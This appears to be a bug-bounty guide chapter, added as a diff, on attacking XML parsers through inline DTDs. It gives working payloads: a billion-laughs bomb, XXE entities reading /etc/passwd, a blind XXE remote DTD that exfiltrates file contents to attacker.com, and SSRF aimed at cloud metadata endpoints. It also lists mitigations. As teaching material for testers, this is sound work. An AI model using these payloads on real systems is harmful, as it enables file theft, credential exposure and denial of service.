@@ -1,0 +1,95 @@
+Chapter 15 – XML Attacks: Exploiting Parsers with Inline DTDs
+XML parsers are everywhere—APIs, file uploads, configuration parsing. If the parser processes inline DTDs, it’s vulnerable to XML bombs (denial of service) and XML External Entity (XXE) attacks (file read, SSRF, port scanning). Here’s how to find, exploit, and report these bugs.
+
+1. XML Basics for Hunters
+XML looks like HTML but with custom tags. Many web services accept XML in request bodies (e.g., SOAP APIs, REST endpoints with Content-Type: application/xml or text/xml).
+
+A DTD (Document Type Definition) can be embedded directly inside the XML (inline) and defines the structure, plus entities (macros).
+
+Inline DTDs are the attack vector.
+
+2. XML Bomb (Billion Laughs Attack) – DoS
+How it works: Define nested entities that expand exponentially. A 10-level deep recursion generates billions of "lol" strings, consuming gigabytes of RAM and crashing the server.
+
+Payload (classic):
+
+xml
+<?xml version="1.0"?>
+<!DOCTYPE bomb [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  ...
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<bomb>&lol9;</bomb>
+Impact: Server unavailability (DoS). In bug bounty, usually rated Medium/High depending on service criticality.
+
+Test: Send this XML to any endpoint that parses XML (e.g., file upload, API with Content-Type: application/xml). If response hangs or server crashes, you’ve found a bug.
+
+3. XML External Entity (XXE) – The Real Jackpot
+External entities: DTDs can include content from external files or URLs via <!ENTITY name SYSTEM "URI"> or <!ENTITY name PUBLIC "public_id" "URI">.
+
+Classic XXE to read files:
+
+xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+If the parser expands &xxe; and the server echoes the result (e.g., in an error message or the response), you’ll see the file content.
+
+Blind XXE (out-of-band): If no output is returned, use a remote DTD or make the server call your server. Example:
+
+xml
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;
+]>
+Then evil.dtd contains:
+
+xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+%eval;
+%exfiltrate;
+This exfiltrates file contents via DNS/HTTP to your server. Use Burp Collaborator or a VPS.
+
+SSRF via XXE: Use http:// or https:// in external entities to force the server to make requests to internal systems (e.g., http://169.254.169.254/latest/meta-data/ on AWS, or internal admin panels).
+
+Port scanning: By timing responses or checking error messages, you can infer open ports by pointing to http://internal-ip:22, etc.
+
+4. Where to Look for XXE
+Any endpoint that accepts XML (even if not obvious): file uploads with XML content, SVG image uploads (SVG is XML), XLSX/DOCX/PDF parsing (they embed XML), REST APIs with Accept: application/xml, SAML authentication, RSS feeds.
+
+Check if the server parses your supplied XML. Use a simple payload: <!DOCTYPE test [ <!ENTITY xxe "test"> ]> and reference &xxe; in a field. If it returns "test", the parser processes inline DTDs.
+
+Test for file read: try /etc/passwd on Linux, C:\windows\win.ini on Windows, or /etc/hostname. Use out-of-band if blind.
+
+Test for SSRF: use Collaborator to see DNS/HTTP callbacks.
+
+5. Mitigations (for reporting)
+Disable inline DTD processing entirely. Most modern parsers have a secure mode.
+
+Python: use defusedxml library.
+
+Ruby: Nokogiri >= 1.5.4 is safe.
+
+Node.js: most parsers like xml2js ignore DTDs.
+
+Java: DocumentBuilderFactory with FEATURE_SECURE_PROCESSING, or better, disable DTDs.
+
+.NET: set ProhibitDtd = true on XmlTextReader, or use safe parsers like XmlReader.
+
+If DTDs are required (rare), disable external entities but still risk bombs; use a parser that limits entity expansion depth.
+
+Apply the principle of least privilege: restrict file system access (chroot), block outbound network from XML parser (firewall whitelist).
+
+6. Bug Bounty Tips
+XXE is often missed. Always test XML parsing when you see Content-Type: application/xml or even text/xml. Use Burp’s “Insert Collaborator payload” to test for blind XXE.
+
+SVG file uploads: embed an XXE payload inside the SVG (which is XML) and upload it. If the server renders the SVG, the entity may trigger.
+
+For DoS bombs, demonstrate that a single request can crash the service (do not repeatedly test on production).
+
+Chain XXE to SSRF to access cloud metadata (AWS, GCP) – this is often a critical finding.
+
